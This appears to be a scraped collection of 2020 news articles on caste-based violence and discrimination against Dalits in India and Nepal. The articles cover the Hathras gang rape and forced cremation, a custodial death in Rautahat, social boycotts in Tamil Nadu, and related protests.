is trending now on Twitter! By Adivasi Lives Matter By Maseera Khan By Sofia Babu Chacko Find out more "

1,"MORE RAUTAHAT, SEPTEMBER 1 The fast-unto-death launched by leaders of the Dalit community over the alleged âmurderâ of a Dalit youth in police custody has entered the fourth day today in Rautahat.  In connection with the August 15 murder of Niranjan Ram, 20, of Garuda Municipality, police from Garuda Area Police Office had taken seven persons, including Bijaya Ram Chamar, in custody for investigation. However, on August 26, Bijaya died in the course of treatment at National Medical College of Birgunj. Dalit leaders accused the police of murdering the youth in custody by meting out physical torture. This prompted the Dalit community to stage protest against police high-handedness. The agitating Dalit community led by the Niranjan Ram and Bijaya Ram Struggle Committee have been organising various protest programmes from the day after Bijayaâs death. Under the leadership of Bahujan Shakti Party central Chairperson and former minister Bisendra Paswan, four persons including Sonalal Paswan and Ramprit Paswan, have been staging a fast-unto-death from Saturday. âWe wonât end the hunger strike until the central government suspends and takes action against SP Rabiraj Khadka, DSP Gyan Kumar Mahato, along with the inspectors, ASIs and head constables involved in torturing the innocent youth to death,â said the former minister. âSimilarly, we need martyrs status for both Niranjan and Bijaya, compensation to the families and job guarantee to at least one person from these families,â he added. Meanwhile, though post-mortem on Bijayaâs body was conducted in TU Teaching Hospital in Kathmandu on Friday itself, the kin of the deceased have refused to receive the body so far. The agitators have vowed not to receive the body until their demands are met. A version of this article appears in e-paper on September 2, 2020, of The Himalayan Times. Â© 2021 The Himalayan Times"

A 19-year-old Indian girl, reportedly gang-raped by four ""upper-caste"" men, in the northern state of Uttar Pradesh this month, succumbed to her injuries at a hospital in New Delhi on Tuesday morning. The victim was transferred to Delhi's Safdarjung Hospital from another facility in the regional town of Aligarh. She was taken to the Aligarh hospital on 15 September, a day after she was allegedly sexually assaulted by four men on a farm in the neighbouring town of Hathras. All four people named by the victim have been arrested and charged under relevant sections of the Indian penal code, including murder and carrying out atrocities against Dalit or people in the lowest strata of the caste system. The incident sparked outrage across the Indian political spectrum as well as social media, with many prominent personalities taking potshots at the state government for rising atrocities against members of the socially underprivileged Dalit community in Uttar Pradesh. The northern state, which is India's most populous, is governed by Prime Minister Narendra Modi's Bharatiya Janata Party (BJP). Lamenting the increasing occurrence of sexual assaults in the state, general secretary of India's main opposition party, Congress, Priyanka Gandhi Vadra remarked that such incidents have sent a shiver down the spines of everyone. ""The culprits should be brought to book"", Vadra wrote in a tweet in Hindi.  Former Uttar Pradesh Chief Minister Mayawati, who is seen as a leader among the Dalit community, has also been attacking the state authorities over the incident. Bollywood actress Kangana Ranaut also expressed dismay over the death of the 19-year-old victim on her Twitter account. Shoot these rapists publicly, what is the solution to these gang rapes that are growing in numbers every year? What a sad and shameful day for this country. Shame on us we failed our daughters #RIPManishaValmiki"

(ANI photo)  BHIM army supporters during a protest over the death of a rape victim in Hathras district of Uttar Pradesh, at India Gate in New Delhi Sept. 30. (ANI photo) NEW DELHI — The gang rape and death of a woman from the lowest rung of India’s caste system sparked outrage across the country Sept. 30, with several politicians and activists demanding justice and protesters rallying in the streets. The attack of the 19-year-old is the latest gruesome case of sexual violence against women to rile India, where reports of rape are hauntingly familiar. The victim, who belonged to the Dalit community, was raped by four men on Sept. 14 in the heartland state of Uttar Pradesh’s Hathras district. The woman’s family told local media that they found her naked, bleeding and paralyzed with a split tongue and a broken spine in a field outside their home. She died two weeks later, on Sept. 29, after battling serious injuries in a hospital in New Delhi. Police said the four men, all from an upper caste, have been arrested. Uttar Pradesh’s chief minister, Yogi Adityanath, Sept. 30 ordered a special investigation team to handle the case and said it will be tried in a fast-track court. In New Delhi, police detained several female activists after they tried to march in the street shouting slogans against Adityanath and Prime Minister Narendra Modi. The demonstrators carried placards that read, “Stop rape culture.” Maimoona Mullah of the All India Democratic Women’s Association said Uttar Pradesh, which is ruled by Modi’s Bharatiya Janata Party and ranks as the most unsafe state for women in the country, had become the “rape state of India.” “We do not accept rape culture in the name of new India,” Mullah said. Earlier on Tuesday, hundreds of protesters from the Bhim Army, a party championing the rights of Dalits, thronged the hospital premises in New Delhi and jostled with police. Party leader Chandra Shekhar Aazad urged Dalits across the country to flood the streets to demand that the perpetrators be hanged. Dalits — formerly known as “untouchables” and at the bottom of India’s unforgiving Hindu caste hierarchy — are victims of thousands of attacks each year. According to human rights organizations, Dalit women are particularly vulnerable to caste-based discrimination and sexual violence. Last month, a 13-year-old Dalit girl was raped and killed in Uttar Pradesh. In December last year, a 23-year-old Dalit woman in the same state died after being set ablaze by a gang of men as she made her way to court to press rape charges. Both cases are pending in court. In the latest case, questions were raised over a hasty cremation, with several politicians calling it an abuse of human rights. The woman was cremated early Sept. 30, with the family alleging that police did not allow them to perform her final rites. Videos on social media show the family weeping as police insisted on cremating the body without allowing them to take it home. Senior Police Officer Vikrant Veer denied the allegations, while the leader of the opposition Congress party, Rahul Gandhi, described the cremation incident as “abusive and unjust.” In India, rape and sexual violence have been under the spotlight since the 2012 gang rape and killing of a 23-year-old student on a New Delhi bus. The attack galvanized massive protests and inspired lawmakers to order the creation of fast-track courts dedicated to rape cases and stiffen penalties for those convicted of the crime. In March, four men sentenced to death for the 2012 attack were hanged. Indians often rally for swift justice in a country where a woman is raped every 15 minutes, according to government data, and sentencing is notoriously delayed by backlogged courts. According to the government, police registered 33,658 cases of rape in 2017 — an average of 92 per day and a 35% jump from 2012. About 10,000 of the reported victims were children. The real figure is believed to be far higher due to the stigma of sexual violence. (Associated Press videojournalist Shonal Ganguly contributed to this report.) Your comment has been submitted.

The Fact News Service Fatehgarh Sahib, September 4 The Aam Aadmi Party (AAP) on Friday protested in front of the deputy commissioner Fatehgarh Sahib’s office, demanding the immediate dismissal of cabinet minister Sadhu Singh Dharmsot. The protest was led by senior party leaders of the district and they burnt effigies of Chief Minister Amarinder Singh and Sadhu Singh Dharmsot. After this, a demand letter was handed over to the district administration. AAP leaders said that Dharmsot is the killer of the future of millions of promising Dalit students. Considering the seriousness of the documentary evidence against Dharmasot with additional documentary evidence submitted to the government, this corrupt minister Sadhu Singh Dharmasot should have been dismissed from the cabinet in five minutes, the AAP protestors said. The AAP leaders accused the Chief Minister of violating all moral and administrative limits to prevent the sacking of Dharmasot, who had directly grabbed Rs 63.91 crore in the scholarship scheme of Dalit students. The AAP leaders said that even after 10 days of the scam, the Congress high command and Chief Minister Amarinder Singh are in a hurry to save their corrupt but ‘earning son’. The AAP leaders, while commenting on the Central Government handing over the departmental inquiry into the scam to 2 officials, they said that the investigation should be done by any agency but the investigation should be time bound under the supervision of the existing judges of the High Court.

Parmar complaining of atrocity on the people of dalit community in Chattgaon village near Depalpur village of Indore district said that recently a woman of Dalit community died in the village. Following her death, her kin and near-and-dear ones took her funeral to the village crematorium ground, where people belonging to the upper caste raised objection on her cremation at the place reserved for the cremation in the village. They claimed that the place is private property and they won’t allow her to cremate here. After waiting for several hours, they decided to conduct her funeral at Depalpur village, about 20 kilometre from her native village. As soon as Parmar and others came to know about entire incident, they rushed to the spot and stopped bereaved members and took funeral procession back to her village for cremation. Parmar claimed that people belonging to the upper caste continue to stop her cremation for more than nine hours in presence of local tehsildar and police party. They had arms and sticks and administrative officials and police party acted like a mute spectator when the drama was going on in the village. Parmar said even 73 years after independence, such incidence are common in the country, where influential people harassing Dalit people and not allowing them to take out marriage procession, not allowing groom to sit on horseback, not allowing Dalit to cremate in the village. Parmar demanded stern action against those who involved in the inhuman act as well as action against administrative and police personnel’s who remained a mute spectator in the matter.

The attack of the 19-year-old is the latest gruesome case of sexual violence against women to rile India, where reports of rape are hauntingly familiar. The victim, who belonged to the Dalit community, was raped by four men on Sept. 14 in the heartland state of Uttar Pradesh’s Hathras district. The woman’s family told local media that they found her naked, bleeding and paralyzed with a split tongue and a broken spine in a field outside their home. She died two weeks later, on Tuesday, after battling serious injuries in a hospital in New Delhi. Police said the four men, all from an upper caste, have been arrested. Uttar Pradesh’s chief minister, Yogi Adityanath, on Wednesday ordered a special investigation team to handle the case and said it will be tried in a fast-track court. In New Delhi, police detained several female activists after they tried to march in the street shouting slogans against Adityanath and Prime Minister Narendra Modi. The demonstrators carried placards that read, “Stop rape culture.” Maimoona Mullah of the All India Democratic Women’s Association said Uttar Pradesh, which is ruled by Modi’s Bharatiya Janata Party and ranks as the most unsafe state for women in the country, had become the “rape state of India.” “We do not accept rape culture in the name of new India,” Mullah said. Earlier on Tuesday, hundreds of protesters from the Bhim Army, a party championing the rights of Dalits, thronged the hospital premises in New Delhi and jostled with police. Party leader Chandra Shekhar Aazad urged Dalits across the country to flood the streets to demand that the perpetrators be hanged. Dalits — formerly known as “untouchables” and at the bottom of India’s unforgiving Hindu caste hierarchy — are victims of thousands of attacks each year.

1,"via Maktoob Media | written by Haneena PA| September 13, 2020 One month after the associate professor in the University of Delhi’s English department and noted anti-caste activist Hany Babu MT was arrested by NIA in the Bhima Koregaon case, Dalit Camera organised a webinar titled “With Professor Hany Babu: Political Voices for Social Justice” on Saturday where parliamentarians and leaders from various political parties took part to raise their voice in support of the arrested professor. 54-year-old Hany Babu was arrested on July 28 by the NIA. MPs, former MPs, and national office-bearers of several political parties accused the authorities of conducting blatant witch-hunting of academicians and activists who always stood with the marginalized in the name of investigations in the Bhima Koregaon case. Fifteen activists and scholars have already been arrested in the case and nine out of these have been in jail for nearly two years, as undertrials. Professor Babu has been a strong advocate for social justice and has worked strenuously in the anti-caste movement, speakers said in the webinar. Dr. Udit Raj, former MP and national spokesperson of Congress pointed out that “the fascist government used Bhima Koregaon case as an excuse for targeting” Hany Babu and other academicians as part of silencing the intellectuals in India. Raj who is also the founder and national chairman of the All India Confederation of SC/ST Organizations said that Babu has worked extensively against the Four-year Undergraduate Program (FYUP) in the University of Delhi which was discriminatory to the students belonging to the marginalized communities and the program was dropped in 2014. Udit Raj and Hany Babu jointly wrote an article in The Hindu on FYUP in 2013. “I know him very well. I worked with him closely,” Raj said. T. K. S. Elangovan, Rajya Sabha member, and Dravida Munnetra Kazhagam (DMK) leader called Hany Babu as a champion of social justice. “His arrest shows how the government wants to make sure that no intellectual remains free to speak out against the regime. Initially, they killed intellectuals, now they are arresting them,” Elangovan noted. DMK leader said that four professors including Babu who worked for the welfare of Dalits and marginalized groups in the country were arrested over flimsy and fabricated charges. Elangovan also urged political parties to unite and raise their voice against the recent arrests of academicians. Rashtriya Janata Dal (RJD) leader and MP Manoj Jha condemned Babu’s arrest and expressed his and his party RJD’s full solidarity with the jailed professor. “The government is trying to strip off professor Hany Babu’s dignity, forcing him to give false testimony in the case and framing him as a person who has close Maoist ties. Hany has always raised his voice for the need for inclusive institutional policies. He fought the system that discriminates against students based on their caste, hence why he’s arrested and held in prison,” said E.T. Mohammed Basheer, MP and the leader of Indian Union Muslim League (IUML). “There should be space to question the power and hierarchy,” Basheer added. He also ensured that Muslim League’s four MPs will stand for justice for Hany Babu in the Parliament. According to Raj Kumar Saini, former MP and Loktantra Suraksha Party leader, Babu was a strong voice of Bahujans in India. Saini who condemned the NIA arrest criticised BJP’s efforts to suppress Bahujan intellectuals and leaders in the country. “Hany babu has done a great job in the matter of reservations including legal interventions,” K. Ambujakshan, general secretary of Welfare Party of India expressed his solidarity and support to professor Babu. “When criminals are in power, Intellectuals are in jail,” said Dalit leader Ambujakshan. Annie Raja, CPI leader and General Secretary of National Federation of Indian Women (NFIW) said that Hany Babu strongly believed in the Constitution and wanted to translate the constitutional rights in the lives of Dalits, tribals, and Bahujans in the country. The webinar also had Dr.Harish MT, brother of Hany Babu who said that the government thinks they can use this case to silence the academicians. “They are not even filing the charge sheet properly,” Harish also demanded the immediate release of his brother and all political prisoners who were arbitrarily arrested and falsely framed by NIA and police. Sachin Narayanan, an assistant professor of English in Delhi University and representative of the Delhi University Teachers Association (DUTA) expressed his thanks for all lawmakers and politicians who joined the campaign for Hany Babu.

Asha was gangraped two weeks ago in a field near her home by four Thakur men. She died on Tuesday in a hospital in New Delhi. Yet her family was deprived of even one intimate moment with her body. At around 2 am on September 30, Asha’s body was cremated by the Uttar Pradesh police without a single family member being present. The family says they did not consent to the cremation. In a video that circulated on social media, the police was seen talking to the family on the night of the cremation. An officer said: “In this extraordinary situation, you have to accept that you have made some mistakes.” Does the family agree? Asha’s sister-in-law told us, “Yes, our fault is that we trusted the police. Yes, our fault is that she was a Dalit girl. Yes, our fault is that we didn’t agree for her to be cremated at night. If she was from a Thakur family, none of our mistakes would have been pointed out.” Today, the Valmiki women no longer feel safe in the Thakur-dominated village. No dignity even in death Compounding Asha’s assault and death, her family is inconsolable about not being able to conduct her last rites with dignity. The family learned of her death a little after 6 am on September 29, when a doctor at Delhi’s Safdarjung Hospital told Asha’s brother, who was waiting outside, that she had died. At 7.15 am, the brother texted Newslaundry: “Ma’am, didi ab nahi rahin.” Ma’am, my sister is no more. The body was taken for postmortem and was returned to the hospital by noon. According to the autopsy report, which was accessed by Newslaundry, the final diagnosis suggests “strangulation with cervical spine injury” and death due to cardiac arrest. A page from the autopsy report. After the postmortem, Asha’s sister-in-law said, it’s unclear what exactly happened to the body, as Asha’s brother and father, who were at the hospital, were surrounded by the media. “When the officials left the hospital in an ambulance with the body, there was no family member in the ambulance,” she said. Instead, Asha’s brother and father were in a car that the ambulance was following from Delhi to Hathras. “At some point, the ambulance and the car split ways,” Asha’s cousin said. “The ambulance took a different route while her brother and father reached home.” The cousin said the police and the ambulance reached Asha’s house a little after midnight, and told the family to cremate the body quickly. The family told the police that according to Hindu traditions, a body cannot be cremated at night, and that they would do so in the morning. Relatives were still on the way and would reach only by daybreak. “The police continued to build pressure,” the cousin said. “They took away one of our relatives from Agra and we still don’t know where he is. We kept trying to request that it’s important for us to be part of this last journey with Asha.” Newslaundry could not identify who this relative was, and where he was “taken”. The cousin added that the police then “caught hold” of another relative and asked to speak with him “in private”. The family refused to allow the relative to go with the police, the cousin explained, fearing for his safety, given the police’s harsh attitude. Anticipating that the body might not be handed over, women in the house began surrounding the ambulance. “The police got so upset that they started pushing our women around,” said Asha’s sister. “Some of them fell into the field on the side of the road, some fell into the thorny bushes on the side. This was done by both male and female police officers.” The women began prostrating before the police, Asha’s sister-in-law said, begging for the body and asking for permission to cremate her in the presence of family. “We fell on the ground. We stretched out our pallus and finally we begged them to at least show us her face once,” she said. But the police only got more aggressive, and family members locked the gate of their house and did not allow any police officers to enter. Asha’s brother cut in: “Forget seeing her face, we haven’t even seen her body bag.” Finally, the police gave up, family members said, and drove the ambulance to the cremation ground. “They burnt her away with petrol and diesel and we still don’t even know if that was Asha’s body or not,” said the sister-in-law, her voice cracking. During the cremation, the police shot a video and later posted it on social media, claiming that Asha’s father had been present at the cremation site. This is vehemently denied by family members, who claim the father had been at home with them. “My father had almost fainted and was lying on a charpoy here when the cremation took place,” Asha’s brother said. “That video is entirely false. The man in that video is someone from our neighbourhood whom they took with them. They made him throw two cow dung cakes into the pyre and made a video saying this is our father.” The family believes the rushed cremation was because they wanted to ask for a second postmortem. Media cacophony When Asha’s father was taken away by the police in the afternoon yesterday, her mother sat in a corner of the courtyard outside the house, her back against a stone pillar. She wore the same blue sari that she had been wearing on Sunday when these correspondents had visited her. Her voice was hoarse from repeated interactions with the media, and she struggled to complete her sentences. Asha’s brother squatted on the floor opposite her, looking dazed and exhausted. Every inch of the house was occupied by journalists and relatives. A few journalists had climbed to the roof with their cameras; others loudly addressed their cameras in different corners of the house. The family had distributed water in plastic cups to the journalists; these cups now littered the floor. A woman from the house intermittently got up to sweep them away as an ABP News reporter thrust her microphone into the mother’s face, saying: “Okay, but wasn’t there a delay from your end also in reporting the rape?” Asha’s mother looked back at her, aghast. After a few more sessions on live television, Asha’s mother got up and went indoors. We sat with her here in silence as she cried and called for her daughter. “How many times am I supposed to keep repeating what happened to my daughter?” she said. “I’m losing my mind. Where were all these media people when my daughter really needed them?” We decided not to interview her. Palpable caste divide In stark contrast, the house opposite Asha’s house was quiet and deserted. Three of the four accused — Ramu, Ravi and Luvkush — live here. Ravi and Luvkush were arrested on September 21 and 25, respectively, and Ramu on September 26. Sandeep, the fourth accused, was arrested on the evening of September 19. The village is dominated by Thakur households, with only four Valmiki (Dalit) houses. Two of these are Asha’s and her relatives. The third Valmiki family lives in a house a few metres away from Asha’s; one of the residents here told Newslaundry: “Yes, we still practise untouchability in this village.” Dalits are treated differently in the shops, the neighbour explained. Water is sprinkled on money they hand over to shopkeepers, and nobody wants to touch anything that they have touched. She said that no Thakur will ever enter a Valmiki house but this, in her opinion, is not unusual, not a part of “caste tension”. Valmiki children in the village. “Yes, a Valmiki will always sit on the floor and the Thakur on a chair or charpoy but that’s just how it is, isn’t it? That’s our tradition,” she said. Her two children, studying Classes 6 and 7, also spoke of how in primary school, the Thakur and Dalit students are made to sit separately after protestations from upper caste children, who did not want to sit with the Dalit children. The fourth Valmiki household in the village refused to speak to us. “I don’t know anything,” a family member said as police personnel walked past. A 75-year-old Thakur resident of the village told Newslaundry he holds no sympathy for the four Thakur accused. “They’ve caused so much nuisance to this village. This Ravi has misbehaved with women even before,” he said. Other villagers said that the four accused had “eve-teased” and harassed Asha a few months ago as well. Even though the Thakur resident did not explicitly admit that the village had a caste divide, when asked if the Thakurs ever attended Valmiki wedding ceremonies he said, “No, we don’t. But they come to our weddings and do the cleaning.” Asha is a pseudonym to protect identity. *** The media must be free and fair, uninfluenced by corporate or state interests.

1,"Hundreds of students, civil society members and Opposition leaders and supporters turned up at Jantar Mantar on Friday evening to demonstrate against the Hathras atrocity, fashioning the largest protest gathering in Delhi since the agitation against the new citizenship regime last winter. Several smaller protests had taken place in the capital since a 19-year-old Dalit girl died in a Delhi hospital on Tuesday, 15 days after being allegedly gang-raped and brutalised in a village in Hathras, Uttar Pradesh. Over the past two days, the police had broken up these demonstrations and booked scores of participants for violating the lockdown. A planned candlelight vigil at India Gate on Friday evening was shifted to the protest plaza of Jantar Mantar after the police tweeted on Thursday night that demonstrations would not be allowed at the original venue. The New Delhi deputy commissioner of police’s office also tweeted that only 100 protesters would be allowed at Jantar Mantar with prior permission. The three Metro stations around the area were shut on Friday evening. But a sea of protesters turned up after Delhi’s ruling Aam Aadmi Party and the Congress publicly supported the programme, promoted on Twitter by student groups, actor Swara Bhasker and the Independent MLA from Gujarat, Jignesh Mevani. Chief minister Arvind Kejriwal, flanked by his ministers and MLAs, spoke at the protest. “Several actions have led people to believe that the culprits are being shielded.... At this point, all that the family need is peace and they should be free to meet whoever they want to. There should be no politics on the matter,” he said. According to the victim’s family, the police took eight days to invoke the charge of gang rape and five days to arrest the suspects. The force is also accused of denying the girl the best possible treatment and then hijacking her body from the hospital and burning it after locking her family at their home. On Friday, her father said the police had confined the family at their home, taken away their phones and thrashed him when he sought to step out. Bhasker, who led the crowd in sloganeering, said: “The cases of rape in Hathras and Balrampur (in Uttar Pradesh, where another woman was gang-raped and murdered this week) have raised questions over the conduct of the authorities. Families have said the first information reports were not registered correctly. The CM must step down.” Among those at the protest site were Mevani, Bhasker, CPM general secretary Sitaram Yechury, CPI leader Kanhaiya Kumar, Bhim Army chief Chandrashekhar Azad and Swaraj India president Yogendra Yadav. “Every day in India, four women are raped but who cares? And this includes the male-dominated Dalit movement too,” Mevani, a Dalit activist, told The Telegraph. So, he said, it’s “good and required” that people voice their protest against the Hathras atrocity. “I hope Mr (Narendra) Modi also opens his mouth…. The Hathras incident is so terrible that there is no option but to fight it out,” he said. Most television news channels, however, had minimal coverage of the protest. Pro-government Twitter handles busied themselves tweeting about a much smaller hunger strike at the same venue by people who allege that actor Sushant Singh Rajput’s death in June was murder, not suicide. BJP politician Kapil Mishra, accused of instigating the February riots that killed 53 people, condemned the protest against the Hathras incident saying the spearheads were “the same people who spread lies about the CAA (Citizenship Amendment Act)”. “Honestly, the protesters are more afraid of the virus than of the police,” said Prasenjeet Kumar, secretary of the Delhi unit of CPIML Liberation’s All India Students’ Association, who has been protesting since Wednesday and has been detained once by the police. “In all these months, we complied with the government’s directives, but the ban on protests is being used to silence dissent itself,” he told this newspaper. “We are protesting, even at the risk of facing police cases, in the hope that this struggle will bring together the movements for both social justice and gender justice. We have several women members out protesting today, including some who are facing police cases for the anti-CAA protests. They may criminalise our protests, but silence on heinous and feudal crimes like what happened in Hathras is criminal.” Youth Congress members dressed as Mahatma Gandhi marched on the road carrying lighted candles. “They (authorities) should understand that Dalit lives matter,” CPI general secretary D. Raja said. “India cannot continue like this. The whole country is agitating for human rights and dignity. Adityanath cannot continue as CM.” Raja added: “I appeal to the President (Ram Nath Kovind), who is from UP. He must intervene. He knows what’s happening. I can’t expect (Prime Minister Narendra) Modi to intervene and set things right.” Yechury, Azad and Yadav too demanded Adityanath’s resignation over the crime, alleged cover-up attempt, forcible burning of the body and police crackdown on the victim’s family and the village that has seen journalists being roughed up. Police later filed an FIR against the protesters under sections of the penal code, Epidemic Act, and Disaster Management Act, cumulatively punishable with up to 18 months in jail. Elsewhere in Delhi, Congress general secretary Priyanka Gandhi Vadra attended a prayer meeting for the victim at the Maharishi Valmiki temple. The victim’s community of Valmiki Dalits worship the Maharishi, considered the author of the original Sanskrit Ramayan. Mahatma Gandhi lived in a room at the temple from 1946 to 1947. “We will ensure justice for our sister. We won’t sit quietly till she gets justice,” Priyanka said. “The government did not help at all. Her family is feeling helpless. We will put political pressure on the government. She wasn’t even given a cremation following Hindu customs.”"
1,"Two violent rapes of Dalit women in Uttar Pradesh's Hathras and Balrampur districts have shaken the conscience of the country. Citizens are outraged and shocked how caste-based violence still exists in progressive India and have pledged to not stop until women in India are safe and protected. Ayushmann Khurrana in Article 15 / IMDB Srishty Ranjan, a New Delhi-based Dalit activist has called out Ayushmann Khurrana for appearing to be caste-sensitive when his movie Article-15 was releasing but now doesn't call these rapes as caste-based acts. When your movie Article 15 was about to release you seemed to be the most caste-sensitive savarna on this planet. @ayushmannk now that you don’t have a movie on release, you cannot even state that she was a dalit woman? pic.twitter.com/3FYJarQHbu Ranveer Singh / Gully Boy Another Dalit activist, Jyotsna Siddharth told CNN-News 18 that we should only take these Bollywood celebrities to be performers and not people who actually care about what happens to marginalized sections in the Indian society. Hello @UNICEF Goodwill Ambassador @priyankachopra, do you want to speak something about the dalit woman of hathras who was killed because of caste-patriarchy and structural violence or are you a hypocrite? do you ever talk to your mom who supports a government which does this? pic.twitter.com/PDbcTyXGVF  Do you think this is sheer ignorance on the part of Bollywood celebrities or actual hypocrisy that allows them to make films on the pain of people but actually not have it in them to speak up when their voices and influence is needed the most?

1,"They say their are being denied groceries, milk and even water from common taps, and that the village panchayat has ordered a fine of Rs 5,000 on those who provide them the essentials As many as 29 Dalit families have allegedly been ostracised in a village in Tamil Nadu’s Krishnagiri district for not withdrawing a case filed against caste-Hindus under the Prevention of Atrocities (against SC/ST) Act. “We did not know what was happening. The shopkeeper suddenly refused to give us groceries. The milk man who used to visit our houses has not come to our Dalit colony since October 2. We did not even get water from the common taps in the village,” said a woman from a Dalit colony in Ulagam village in Hosur. Related News: Amid UP Dalit rape shock, TN shows why the community gets a raw deal It all started two years ago, after a 22-year-old Dalit youth Suriyakumar, belonging to the Adi Dravidar caste from the village, eloped with a 17-year-old minor girl belonging to the Kurumbar community (categorised as most backward) of Maniyangal village in Hosur. Soon after the incident, while the parents of the girl filed a police complaint against Suriyakumar on the charges of kidnapping and under the Protection of Children against Sexual Offences (POCSO) Act, the caste-hindus in Ulagam village where Suriyakumar’s family reside, barged into the Dalit colony and assaulted the people there “We were unaware that Suriyakumar had eloped with a caste-Hindu girl. They barged into our houses and threw everything that was inside and assaulted us,” says another woman. Based on a complaint from the Dalit people in the village, the police filed a case against as many as 30 caste-Hindus. Related News: Dalit AIADMK MLA weds Brahmin woman to script new story Six months later when the caste-Hindu girl became a major, both the families agreed to her marriage with Suriyakumar, the couple did an inter-caste marriage. The girl’s family then withdrew the case they had filed against Suriyakumar. But, the Dalits did not withdraw the Prevention of Atrocities (against SC/ST) Act case filed against caste-Hindus in the Ulagam village. The case came up for hearing on October 1. “They told us many times to withdraw the case. We did not want to withdraw the case because the caste-Hindus were neither the relatives of the girl nor did they belong to the girl’s village. These caste-Hindu men were all from our own village. They assaulted us just because our man eloped with a caste-Hindu girl. They did not want one of us to do an inter-caste marriage,” says T Sethu, a villager. According to the villagers, the decision to order a social boycott of the 29 Dalit families was taken at the village caste panchayat. “They did not hear our side at all. We are suffering just because we stood up for ourselves,” adds Sethu. Related News: Do cities offer safe abode for Dalits from villages like Hathras? Yes, and no The Dalit families also alleged that casteist slurs are hurled at them whenever they go past the houses of caste-Hindus. “We don’t intentionally pass by their houses. But, when we went to get groceries and ration products from the ration shop located in a street with a predominantly caste-Hindu population, a few men abused us using our caste name and asked us not to step into the caste-Hindu streets,” says another woman from the Ulagam village. The village caste panchayat has also ordered that a fine of Rs 5,000 will be collected from people who gives groceries, milk and water to the Dalit people in the village. When asked about it, District Revenue Officer Gunasekaran said he was not aware of the incident and that an inquiry would be conducted into the matter."
1,"Yet another case of a panchayat president belonging to Scheduled Castes (SC) being discriminated against by a dominant caste has surfaced in Tamil Nadu. S Rajeswari, president of the Vanniyar-dominated Therkuthittai village in Cuddalore district, has alleged that she was made to sit on the floor during meetings of the panchayat board by the vice-president ever since she was elected to the post in January this year. As photos of Rajeswari sitting on the floor while members of the Therkuthittai village panchayat sitting on chairs during a meeting held on July 17 went viral on social media, the district administration swung into action on Saturday. A case under various sections of the Scheduled Castes and the Scheduled Tribes (Prevention of Atrocities) Amendment Act has been filed against vice-president Mohanrajan and the panchayat secretary Sindhuja, who has been placed under suspension. District Collector Chandra Sekhar Sakhamuri and Cuddalore District Superintendent of Police M Sree Abhinav held discussions with the panchayat president and are investigating the incident. As photos of Rajeswari sitting on the floor while members of the Therkuthittai village panchayat sitting on chairs went viral on social media, the district police swung into action on Saturday. A case under various sections of the Scheduled Castes and the Scheduled Tribes (Prevention of Atrocities) Amendment Act has been filed against vice-president Mohanrajan and the panchayat secretary. “The President of the panchayat has filed a complaint on Saturday morning and a case has been filed. We are investigating into the incident and we will ensure strict action against those who have erred,” Cuddalore District Superintendent of Police M Sree Abhinav told DH. The incident in Cuddalore district has come to light within two months of a panchayat president in Tiruvallur district near Chennai being not allowed to unfurl the national flag on the occasion of Independence Day. However, V Amurtham, president of Aathupaakam village, hoisted the tricolour five days later at the intervention of the district administration. Speaking to DH from Therkuthittai village, around 240 km from here, Rajeswari said the vice-president never allowed her to discharge her duties as the president and even prevented her from hoisting the national flag on the Independence Day. “We have had four meetings since January and in all the meetings I was asked to sit on the floor while the vice-president and four members of the panchayat belonging to the dominant caste sat on chairs. The fifth member from the SC community was also not allowed to sit on a chair. They want me to be inferior to them,” Rajeswari said. The village consists of around 500 families who are mostly Vanniyars and 100 households from the SC community. The panchayat is reserved for SC community. Rajeswari’s husband Saravanakumar said the family did not muster the courage to speak out against the discrimination due to fear. In his reaction to the incident, Chidambaram Lok Sabha MP, and Dalit leader Thol. Thirumavalavan said he has information that at least 10 panchayat presidents belonging to Scheduled Castes are being discriminated against by dominant castes in the villages. “Only a few incidents of discrimination against Dalit panchayat leaders come out in public. The dominant castes do not allow these leaders to function,” he said. Thirumavalavan also demanded that the Tamil Nadu government take steps to check whether 2,800 panchayat presidents belonging to the SC community are able to exercise their responsibility and publish a “white paper” on the issue. “But the incidents in the past few weeks forced us to come out and express our anguish. The vice-president openly tells me and my wife that we are inferior to him and should keep away from the village administration,” he said. It began with Saravanakumar keeping the keys of the over-head tank of the village in his possession and the vice-president questioning the move. “We locked and the key was with us. But they used casteist slurs to attack us and get back the key. It is then we decided enough is enough and that we cannot tolerate anymore,” Saravanakumar said.

1,"A Dalit woman whose two minor daughters were found dead under mysterious circumstances in Walayar in Kerala three years ago after they were allegedly sexually assaulted, began another round of protest on Monday seeking justice. Leader of opposition Ramesh Chennithala and Bharatiya Janata Party state president K Surendran called on the mother who is staging a dharna outside her home in Palakkad district. “It is worse than the Hathras case in Uttar Pradesh. People who shed tears are ignoring two murders that happened in their own backyard. It is sad the mother is forced to begin another round of stir,” said Chennithala. He sought action against police officers who reportedly sabotaged the case. The two sisters aged 12 and eight were found hanging in their home in a span of 52 days in Walayar when their parents went for work in 2017. The case had seen many twists and turns since then. Last month the Kerala Government had informed the high court that the case was not investigated properly and it was ready for a re-investigation. The mother had approached the HC for a court-monitored central agency probe. Amid the latest protest, the stepfather of the girls alleged that he was forced to own up the crime by the investigating officer and that he was feeling suicidal. He said police want to protect the perpetrators of the crime so they were on the lookout for scapegoats. “I was threatened several times by the police. They backed out when I told them that I would die by suicide,” he said. Kerala law minister A K Balan said the government has limitations as the case was in the court now. The ruling CPI(M) also maintained that the party supports the mother of the two girls but opposition parties were using her for political reasons. The autopsy report had found that both girls were subjected to sexual assaults. The older girl died on January 13, 2017 and the younger one 52 days later. After the death of the older girl, the mother had named a few accused but the police failed to take any action which led to the second death, she alleged. Though both died under mysterious circumstances there was a concerted effort to dismiss the deaths as suicide. “I will die on the street fighting for justice. When I met the CM a couple of months back he said there will be a CBI probe. I feel cheated now,” said the mother. She also said that the police officers who ‘weakened’ the case were recently promoted. Both she and her husband work as labourers. Last year a Protection of Children from Sexual Offences Act (POCSO) court had set free four accused and passed serious strictures against the investigating team. But the police officer who headed the investigation was promoted later. The acquittals sparked indignation in the state after which the high court took up the case suo moto but proceedings were stalled again after the government announced a judicial commission. A lawyer N Rajesh, who represented one of the accused in the case, was later appointed as district child welfare committee president, a body aimed at protecting rights of children. During trial many witnesses were also turned hostile and they were not booked. While acquitting the accused the court had passed strictures against the prosecution. The prosecutor was also sacked later. The ruling CPI(M) is facing criticism as most of the accused are reported to be party workers. The state women’s commission also failed to come to the rescue of parents due to political pressure, said activists who are helping the parents of the two girls.

